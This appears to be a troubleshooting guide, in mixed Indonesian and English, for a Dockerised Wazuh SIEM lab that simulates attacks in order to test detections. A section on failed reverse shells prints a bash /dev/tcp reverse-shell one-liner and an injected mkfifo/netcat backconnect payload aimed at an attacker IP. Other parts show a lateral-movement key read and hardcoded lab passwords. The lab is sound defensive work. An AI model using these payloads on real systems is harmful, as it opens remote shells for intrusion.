# Troubleshooting Guide

## Container & Setup Issues

### Setup script fail di "Generate certificates"

**Symptom:**
```
[!] Failed downloading wazuh-certs-tool.sh
```

**Cause:** No internet, atau Wazuh repo unreachable

**Fix:**
```bash
# Manual download
curl -sO https://packages.wazuh.com/4.7/wazuh-certs-tool.sh
mv wazuh-certs-tool.sh ./
bash ./generate-certs.sh
```

---

### Wazuh Indexer fail to start

**Symptom:**
```
wazuh-indexer  | ERROR: max virtual memory areas vm.max_map_count [65530] is too low
```

**Fix:**
```bash
sudo sysctl -w vm.max_map_count=262144
# Permanent
echo "vm.max_map_count=262144" | sudo tee -a /etc/sysctl.conf
```

---

### Wazuh Dashboard "Unable to connect to Indexer"

**Symptom:** Dashboard accessible tapi gak bisa show data.

**Diagnosis:**
```bash
# Test indexer reachable dari dashboard
docker exec wazuh-dashboard curl -k https://wazuh-indexer:9200 -u admin:SecretPassword
```

**Fix:**
1. Pastikan indexer udah ready (lihat logs)
   ```bash
   docker logs wazuh-indexer --tail 50
   ```
2. Restart dashboard
   ```bash
   docker compose restart wazuh-dashboard
   ```

---

### Agent gak ke-register

**Symptom:** Di dashboard, agent gak muncul di daftar.

**Diagnosis:**
```bash
# Cek dari manager side
docker exec wazuh-manager /var/ossec/bin/agent_control -lc

# Cek dari agent side
docker exec dmz-web cat /var/ossec/logs/ossec.log | tail -30
docker exec dmz-web /var/ossec/bin/agent_control -i
```

**Fix:**
```bash
# Manual re-register
docker exec dmz-web /var/ossec/bin/agent-auth \
  -m 172.30.0.10 \
  -A dmz-web \
  -G scenario-net-traversal,dmz

# Restart agent
docker exec dmz-web /var/ossec/bin/wazuh-control restart
```

---

### Custom rules gak ke-load

**Symptom:** Alert dari rule 100xxx gak muncul saat attack.

**Diagnosis:**
```bash
# Verify rule file ada di manager
docker exec wazuh-manager ls /var/ossec/etc/rules/

# Test rule logic
docker exec wazuh-manager /var/ossec/bin/wazuh-logtest
# Paste raw log buat test
```

**Fix:**
```bash
# Copy rules ke proper location
docker cp wazuh/custom-rules/local_rules.xml \
  wazuh-manager:/var/ossec/etc/rules/local_rules.xml

# Restart manager
docker exec wazuh-manager /var/ossec/bin/wazuh-control restart
```

---

### Container build fail - apt-get error

**Symptom:**
```
E: Unable to locate package wazuh-agent=4.7.5-1
```

**Cause:** Wazuh repo updated atau version specifier outdated.

**Fix:**

Edit `Dockerfile` di `targets/<name>/`:
```dockerfile
# Ubah dari:
WAZUH_MANAGER="172.30.0.10" apt-get install -y wazuh-agent=4.7.5-1
# Jadi:
WAZUH_MANAGER="172.30.0.10" apt-get install -y wazuh-agent
```

---

### Reverse shell gak nyampe

**Symptom:** Listener gak terima koneksi setelah trigger payload.

**Diagnosis:**

1. **Cek network reachability:**
   ```bash
   # Dari dalam dmz-web container
   docker exec dmz-web curl -m 3 http://10.10.10.99:4444 || echo "blocked"
   ```

2. **Cek payload encoding:**
   ```bash
   # Trigger manual buat verify
   docker exec dmz-web bash -c 'bash -i >& /dev/tcp/10.10.10.99/4444 0>&1'
   ```

**Common fix:**

- Listener listen di IP yang bener (0.0.0.0 vs spesifik)
- Firewall di Kali host gak blok
- ATTACKER_IP env var benar di script

**Alternatif payload (kalau bash gagal):**
```bash
# Pakai netcat backconnect
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.99 4444 >/tmp/f
```

---

### SSH lateral gagal

**Symptom:** SSH ke internal-app reject key.

**Diagnosis:**
```bash
# Cek public key matched di internal-app
docker exec internal-app cat /home/webapp/.ssh/authorized_keys

# Cek private key di dmz-web
docker exec dmz-web cat /var/www/html/.maintenance_key
```

**Fix:** Pastikan setup script jalan dengan benar (regenerate keys):
```bash
# Hapus dan regenerate
rm targets/dmz-web/ssh_keys/id_rsa*
rm targets/internal-app/ssh_keys/id_rsa.pub
./setup.sh
```

---

### Permission denied on auditd

**Symptom:**
```
auditctl: Cannot open /etc/audit/audit.rules
```

**Cause:** Container butuh capability tambahan.

**Fix:** Sudah di-handle di docker-compose (`cap_add: AUDIT_WRITE, AUDIT_CONTROL`). Kalau masih issue, run dengan privileged:

```yaml
# docker-compose.yml
services:
  dmz-web:
    privileged: true   # tambahin ini
```

⚠️ Trade-off: less isolation, tapi audit jalan.

---

## Performance Issues

### Wazuh Indexer pakai banyak RAM

**Cause:** Default heap 2GB. Bisa di-tune.

**Fix:**
```yaml
# docker-compose.yml
wazuh-indexer:
  environment:
    - "OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g"  # turunkan dari 2g
```

⚠️ Trade-off: query lebih lambat kalau alert volume tinggi.

---

### Disk usage cepet penuh

**Cause:** Wazuh archive logs default ke `/var/ossec/logs/archives/`

**Fix:**
```bash
# Disable archive logs
docker exec wazuh-manager bash -c "
  sed -i 's|<logall>yes</logall>|<logall>no</logall>|' /var/ossec/etc/ossec.conf
  sed -i 's|<logall_json>yes</logall_json>|<logall_json>no</logall_json>|' /var/ossec/etc/ossec.conf
  /var/ossec/bin/wazuh-control restart
"
```

---

## Reset Procedures

### Soft reset (keep data, restart services)
```bash
docker compose restart
```

### Hard reset (wipe everything, start fresh)
```bash
docker compose down -v
rm -rf certs/*  # regenerate certs
./setup.sh
```

### Reset alerts only (keep agents registered)
```bash
docker exec wazuh-indexer curl -k -u admin:SecretPassword \
  -X DELETE "https://localhost:9200/wazuh-alerts-*"
```

---

## Logs Reference

| Container | Logs |
|-----------|------|
| `wazuh-manager` | `/var/ossec/logs/ossec.log` |
| `wazuh-indexer` | `/var/log/wazuh-indexer/wazuh-cluster.log` |
| `wazuh-dashboard` | docker logs |
| Agent | `/var/ossec/logs/ossec.log` di tiap target |
| Auditd | `/var/log/audit/audit.log` |
| Apache | `/var/log/apache2/access.log`, `error.log` |
| MySQL | `/var/log/mysql/error.log` |
| SSH | `/var/log/auth.log` |

Quick view:
```bash
docker compose logs -f wazuh-manager
docker exec dmz-web tail -f /var/log/auth.log
```

---

## Getting Help

Kalau stuck:

1. Check container status: `docker compose ps`
2. Check logs: `docker compose logs <service>`
3. Test connectivity dari container:
   ```bash
   docker exec <container> ping <target>
   docker exec <container> nc -zv <host> <port>
   ```
4. Test Wazuh API:
   ```bash
   docker exec wazuh-manager curl -ku wazuh-wui:'MyS3cr37P450r.*-' \
     https://localhost:55000/agents | jq .
   ```
